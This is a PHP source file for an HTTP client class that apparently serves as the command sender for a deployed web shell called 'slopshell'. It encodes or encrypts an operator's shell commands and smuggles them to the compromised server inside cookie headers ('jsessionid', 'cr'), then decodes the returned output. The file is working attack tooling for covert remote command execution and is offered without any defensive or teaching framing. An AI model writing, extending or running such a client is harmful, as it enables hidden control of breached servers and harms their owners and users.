<?php

namespace curlStuff\defaultClient;

use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use Psr\Http\Message\ResponseInterface;
use GuzzleHttp\Exception\ConnectException;

class genericClientExecuteCommands extends Client
{

    public function __construct(array $config = [])
    {
        $config['http_errors'] = false;
        $config['debug'] = false;
        parent::__construct($config);
    }

    public function head($uri, array $options = [], array $slopshell = []): ResponseInterface
    {
        try {
            $c = match (true) {
                str_contains($slopshell['cr'], "1b") !== false => $this->packageCommands("1b", $slopshell['command']),
                str_contains($slopshell['cr'], "1") !== false => $this->packageCommands("1", $slopshell['command']),
                default => $this->packageCommands("e", $slopshell['command']),
            };
            $options['headers']['Cookie'] = sprintf("jsessionid=%s; %s=%s; uuid=%s; cr=%s", $c['command'], $slopshell['cname'], $slopshell['cval'], $slopshell['uuid'], $slopshell['cr']);
            return parent::head($uri, $options);
        }catch (ConnectException){
            throw new \Exception("\033[0;31mIt appears as though we were not able to connect properly. Please check the supplied information and try again. Are you sure your shell was successfully deployed?\033[0m");
        }
    }

    private function packageCommands(string $type, string $command): array
    {
        switch (true){
            case str_contains($type, "1b") !== false:
                return [
                    "type" => "1b",
                    "command" => base64_encode($command)
                ];
            case str_contains($type, "1") !== false:
                return [
                    "type" => "1",
                    "command" => base64_encode(serialize(base64_encode($command)))
                ];
            default:
                $additional_data = openssl_random_pseudo_bytes(openssl_cipher_iv_length("aes-256-cbc"));
                $nonce = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_CHACHA20POLY1305_IETF_NPUBBYTES);
                $key = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_CHACHA20POLY1305_IETF_KEYBYTES);
                $ct = sodium_crypto_aead_chacha20poly1305_encrypt($command, $additional_data, $nonce, $key);
                return [
                  "type" => "e",
                  "command" => base64_encode(sprintf("%s.%s.%s.%s", base64_encode($nonce), base64_encode($key), base64_encode($additional_data), base64_encode($ct)))
                ];
        }
    }

    private function processReturnedCommand(mixed $command)
    {
        if (preg_match("/^(i|s|a|o|d)(.*);/si", $command)){
            return unserialize(base64_decode($command), ['allowed_classes' => false]);
        }else{
            return explode(":", trim(base64_decode($command)));
        }
    }
}